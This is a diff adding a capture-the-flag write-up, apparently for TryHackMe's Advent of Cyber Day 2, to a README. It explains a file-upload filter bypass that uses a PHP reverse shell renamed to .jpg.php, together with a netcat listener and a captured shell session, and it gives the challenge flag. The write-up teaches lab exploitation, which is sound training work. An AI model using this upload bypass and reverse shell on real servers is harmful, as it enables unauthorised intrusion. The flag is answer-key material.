@@ -61,4 +61,112 @@ I have also included the shell script I wrote in the day01-christmas-crisis dire
 
 > Learn about basic file upload filter bypasses by performing a security audit on the new security management server!
 
-IP: ``
+IP: `10.10.119.58`
+
+### Basic enumeration
+
+Firstly, I checked the HTTP server running on port 80.
+
+![screenshot](day02-elf-strikes-back/initial_page.png)
+
+### What string of text needs added to the URL to get access to the upload page?
+
+We can use the id given to us (`ODIzODI5MTNiYmYw`) to find an upload page at `http://10.10.119.58/?id=ODIzODI5MTNiYmYw`.
+
+![screenshot](day02-elf-strikes-back/initial_page_id.png)
+
+### What type of file is accepted by the site?
+
+If we examine the source code, we find the following the the HTML code:
+```HTML
+<input type=file id="chooseFile" accept=".jpeg,.jpg,.png">
+```
+It turns out that this page only accepts image files.
+
+### In which directory are the uploaded files stored?
+
+After poking around in the address bar, I found that the uploads are kept in the `/uploads/` directory.  
+
+We can find the uploaded files at `http://10.10.119.58/uploads/`.
+
+### Getting a shell
+
+Firstly, I wanted to find out what was running the web server. Therefore, I opened the network tab and reloaded the page to get the response headers.
+
+![screenshot](day02-elf-strikes-back/network_tab.png)
+
+We see that the server is running Apache 2.4.37 on CentOS powered by PHP. Therefore, I got a PHP reverse shell script from [Pentest Monkey](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php).  
+
+Be sure to change the following lines in the PHP file:
+```php
+$ip = '127.0.0.1';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+```
+
+Then, I renamed the file to `php-reverse-shell.jpg.php` to circumvent the checks and uploaded the file.
+
+**Establishing the reverse shell connection**
+
+Since I set the PHP reverse shell to connect on port 4444, I set up a netcat listener on that port.
+
+```sh
+nc -lvnp 4444
+```
+
+Finally, I visited the following URL `http://10.10.119.58/uploads/` to run the PHP script.  
+
+I was then greated by this beautiful message:
+
+```
+Listening on 0.0.0.0 4444
+Connection received on 10.10.119.58 54002
+Linux security-server 4.18.0-193.28.1.el8_2.x86_64 #1 SMP Thu Oct 22 00:20:22 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 13:25:23 up 41 min,  0 users,  load average: 0.00, 0.00, 0.09
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh: cannot set terminal process group (823): Inappropriate ioctl for device
+sh: no job control in this shell
+sh-4.4$
+```
+
+Bingo! Now that we have a reverse shell, what next?
+
+### What is the flag in /var/www/flag.txt?
+
+First, I made sure I was successfully connected to the server:
+
+```
+sh-4.4$ whoami
+whoami
+apache
+sh-4.4$ pwd
+pwd
+/
+```
+
+Now that we have a shell, we can read the flag:
+
+```
+sh-4.4$ cat /var/www/flag.txt
+cat /var/www/flag.txt
+
+
+==============================================================
+
+
+You've reached the end of the Advent of Cyber, Day 2 -- hopefully you're enjoying yourself so far, and are learning lots! 
+This is all from me, so I'm going to take the chance to thank the awesome @Vargnaar for his invaluable design lessons, without which the theming of the past two websites simply would not be the same. 
+
+
+Have a flag -- you deserve it!
+THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}
+
+
+Good luck on your mission (and maybe I'll see y'all again on Christmas Eve)!
+ --Muiri (@MuirlandOracle)
+
+
+==============================================================
+```
+
+And so with that, we get a nice message and the flag: `THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}`.
